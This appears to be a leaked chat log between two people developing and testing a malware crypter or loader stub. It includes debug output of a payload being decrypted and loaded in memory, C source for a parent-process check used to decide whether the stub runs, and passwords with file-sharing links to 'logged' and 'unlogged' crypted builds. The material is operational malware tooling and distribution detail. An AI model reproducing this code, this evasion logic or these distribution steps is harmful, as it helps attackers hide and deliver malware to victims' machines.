@@ -1,0 +1,108 @@
+[06.09.21 12:43:26] elijah: where does krypt write logs? Where do I find them?
+[06.09.21 12:44:14] allen: Run DebugView.....
+[06.09.21 12:44:50] elijah: thanks, I'll try it now.
+[06.09.21 12:48:43] elijah: ``
+00000001 0.00000000 [5912] DllMain(DLL_PROCESS_ATTACH)
+00000002 0.00024570 [5912] CheckRun()...
+00000003 0.01392110 [2328] DllMain(DLL_PROCESS_ATTACH)
+00000004 0.01456890 [2328] CheckRun()...
+00000005 0.01870040 [2328] CheckRun() returns 0;
+00000006 0.02037830 [2328] Payload extracted and uncrypted;
+00000007 0.02046650 [2328] Loading library from payload; Calling EntryProc(DLL_PROCESS_ATTACH)
+00000008 10.94856071 [4416] DllMain(DLL_PROCESS_ATTACH)
+00000009 10.94862175 [4416] CheckRun()...
+00000010 10.96027470 [1764] DllMain(DLL_PROCESS_ATTACH)
+00000011 10.96038914 [1764] CheckRun()...
+00000012 10.96513271 [1764] CheckRun() returns 0;
+00000013 10.96683216 [1764] Payload extracted and uncrypted;
+00000014 10.96719170 [1764] Loading library from payload; Calling EntryProc(DLL_PROCESS_ATTACH)
+00000015 21.48033333 [4744] DllMain(DLL_PROCESS_ATTACH)
+00000016 21.48040199 [4744] CheckRun()...
+00000017 21.49256706 [1564] DllMain(DLL_PROCESS_ATTACH)
+00000018 21.49263954 [1564] CheckRun()...
+00000019 21.49611855 [1564] CheckRun() returns 0;
+00000020 21.49779701 [1564] Payload extracted and uncrypted;
+00000021 21.49786377 [1564] Loading library from payload; Calling EntryProc(DLL_PROCESS_ATTACH)
+00000022 22.72169495 [5948] DllMain(DLL_PROCESS_ATTACH)
+00000023 22.72187233 [5948] CheckRun()...
+00000024 22.73323822 [5948] CheckRun() returns 3;
+
+```
+[06.09.21 12:48:53] elijah: several restarts of the Lowder
+[06.09.21 12:49:02] elijah: and the last one - restart via holoving
+[06.09.21 12:50:11] allen: the last one is chopped when checking for the parent. Wrong one!!!
+[06.09.21 12:51:24] elijah: And who should be?
+[06.09.21 12:51:52] allen: static int CheckParent()
+{
+	int pid = -1;
+	HANDLE hProcess;
+	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	tagPROCESSENTRY32 pe = { 0 };
+	
+	pe.dwSize = sizeof(tagPROCESSENTRY32);
+	
+	if (!strname)
+		return 3;
+
+	pid = GetCurrentProcessId();
+	
+	if (Process32First(h, &pe))
+	{
+		do
+		{
+			if (pe.th32ProcessID == pid)
+			{
+				hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ParentProcessID);
+				if (hProcess != NULL)
+				{
+					HMODULE hMod;
+					DWORD cbNeeded;
+					CHAR processName[MAX_PATH];
+					if (EnumProcessModules(hProcess, &hMod, sizeof(&hMod), &cbNeeded))
+					{
+						GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName) / sizeof(CHAR));
+						CloseHandle(h);
+						if (memcmp(strname, processName, strlen(strname)) == 0)
+							return 0;
+						return 3;
+					}
+				}
+			}
+		} while (Process32Next(h, &pe))
+	}
+	CloseHandle(h);
+	return 3;
+}
+[06.09.21 12:52:21] allen: The code of the parent's check function.
+[06.09.21 12:58:34] elijah: ``
+if (memcmp(strname, processName, strlen(strname)) == 0)
+return 0;
+return 3;
+```
+[06.09.21 12:58:41] elijah: what value should strname have
+[06.09.21 13:02:45] allen: Name of the exe/run.
+[06.09.21 13:03:21] allen: I'll be back in about 45 minutes.
+[06.09.21 13:43:21] allen: I'm here. I'm here.
+[06.09.21 14:04:43] elijah: Tell me about restarting your stub. Here it starts via rundll32, restarts itself via rundll32 and here it checks who its parent is. If not rundll32 - return 3. Like this?
+[06.09.21 14:05:07] allen: Yes.
+[06.09.21 14:06:36] elijah: and if I start it via holoving, in theory it should also restart itself the first time?
+[06.09.21 14:06:52] allen: Yes.
+[06.09.21 14:07:09] elijah: and how does it restart itself? Through the command line?
+[06.09.21 14:07:17] allen: Yes.
+[06.09.21 14:08:20] allen: I'll think of something by tomorrow...
+[06.09.21 14:11:11] elijah: okay.)
+[07.09.21 06:28:09] allen: Hi. Let me make you one without checking on the guy.
+[07.09.21 06:32:20] elijah: Hi! Do you need something from me?
+[07.09.21 06:32:36] allen: No.
+[07.09.21 06:32:46] elijah: ok, I'll wait then)
+[07.09.21 06:33:05] allen: same with logging.
+[07.09.21 06:45:54] allen: Password `LlksdjflsfoerooOoijoidfs978.zdf,mkl`.
+[07.09.21 06:46:07] allen: https://file.io/4iUGkE8N7pCi
+[07.09.21 06:52:10] elijah: +
+[07.09.21 07:53:45] elijah: I checked cryptos. Both work
+[07.09.21 07:54:17] allen: Now you want me to give you without logging?
+[07.09.21 07:58:57] elijah: go ahead.
+[07.09.21 08:05:02] allen: `LjlkdJLkjlkdjoeooOooeoerwoicz'
+https://file.io/asOKA6BZaGqa
+[07.09.21 08:10:17] elijah: +
+[07.09.21 09:18:33] elijah: unlogged versions work too
